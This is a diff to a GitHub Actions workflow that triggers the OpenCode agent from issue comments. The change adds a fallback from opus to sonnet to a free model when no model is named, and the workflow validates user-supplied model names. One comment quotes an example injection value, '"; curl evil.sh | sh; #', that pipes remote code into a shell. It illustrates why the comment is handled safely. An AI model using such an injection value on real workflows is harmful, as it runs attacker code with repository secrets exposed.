@@ -4,6 +4,14 @@
 #     /oc add a dark mode toggle to SecurityActivity
 #     /oc model=anthropic/claude-opus-5 fix the crash when a profile has no apps
 #
+# With no model= given, the run cascades opus -> sonnet -> a free OpenRouter
+# model, trying the next tier only if the previous one's API call itself
+# errors out (rate limit, spend cap, provider outage). It canNOT detect "the
+# model finished but the fix was wrong" - that isn't a failure GitHub Actions
+# can see, so a bad-but-successful completion never falls through to the next
+# tier. Naming a model explicitly skips the cascade entirely - that's a
+# deliberate choice, not a starting point for one.
+#
 # NEVER add this workflow to a public repo. A public repo plus a comment trigger
 # means a stranger can run your agent on your OpenRouter key.
 
@@ -48,27 +56,74 @@ jobs:
           #   "; curl evil.sh | sh; #
           # would otherwise execute on the runner with your secrets in scope.
           BODY: ${{ github.event.comment.body }}
-          DEFAULT_MODEL: openrouter/anthropic/claude-sonnet-5
         run: |
           set -euo pipefail
           MODEL="$(printf '%s' "$BODY" \
             | grep -oiE '(^|[[:space:]])model=[A-Za-z0-9._/@:-]+' \
             | head -1 | sed -E 's/.*model=//' || true)"
 
+          if [ -z "$MODEL" ]; then
+            echo "explicit=false" >> "$GITHUB_OUTPUT"
+            echo "no model= given - will cascade opus -> sonnet -> free"
+            exit 0
+          fi
+
           # The character allowlist above is what neutralises injection even
           # through the GITHUB_OUTPUT path.
           case "$MODEL" in
             openrouter/*) ;;                       # already fully qualified
             */*) MODEL="openrouter/$MODEL" ;;      # "anthropic/claude-opus-5" -> prefix it
-            *) MODEL="$DEFAULT_MODEL" ;;
           esac
 
+          echo "explicit=true" >> "$GITHUB_OUTPUT"
           echo "model=$MODEL" >> "$GITHUB_OUTPUT"
-          echo "using model: $MODEL"
+          echo "using explicit model: $MODEL"
 
-      - uses: anomalyco/opencode/github@latest
+      # Explicit choice: exactly one attempt, no fallback. You asked for this
+      # model specifically.
+      - name: Run OpenCode (requested model)
+        if: steps.parse.outputs.explicit == 'true'
+        uses: anomalyco/opencode/github@latest
         env:
           OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
         with:
           model: ${{ steps.parse.outputs.model }}
           share: 'false'   # private repo - never publish the session
+
+      # No model given: cascade. Each tier only runs if every prior tier's
+      # own API call failed - continue-on-error keeps the job alive so the
+      # next tier gets a turn, and `outcome` (not `conclusion`) is what still
+      # reports the true pass/fail of a continue-on-error step.
+      - name: Run OpenCode (tier 1 - opus)
+        id: tier1
+        if: steps.parse.outputs.explicit == 'false'
+        continue-on-error: true
+        uses: anomalyco/opencode/github@latest
+        env:
+          OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
+        with:
+          model: openrouter/anthropic/claude-opus-5
+          share: 'false'
+
+      - name: Run OpenCode (tier 2 - sonnet)
+        id: tier2
+        if: steps.parse.outputs.explicit == 'false' && steps.tier1.outcome == 'failure'
+        continue-on-error: true
+        uses: anomalyco/opencode/github@latest
+        env:
+          OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
+        with:
+          model: openrouter/anthropic/claude-sonnet-5
+          share: 'false'
+
+      # Last resort, free tier. Not benchmarked against this codebase - if it
+      # keeps struggling, that's a signal to raise the tier manually with
+      # /oc model=..., not to expect this rung to carry hard fixes.
+      - name: Run OpenCode (tier 3 - free)
+        if: steps.parse.outputs.explicit == 'false' && steps.tier1.outcome == 'failure' && steps.tier2.outcome == 'failure'
+        uses: anomalyco/opencode/github@latest
+        env:
+          OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
+        with:
+          model: openrouter/z-ai/glm-5.2:free
+          share: 'false'
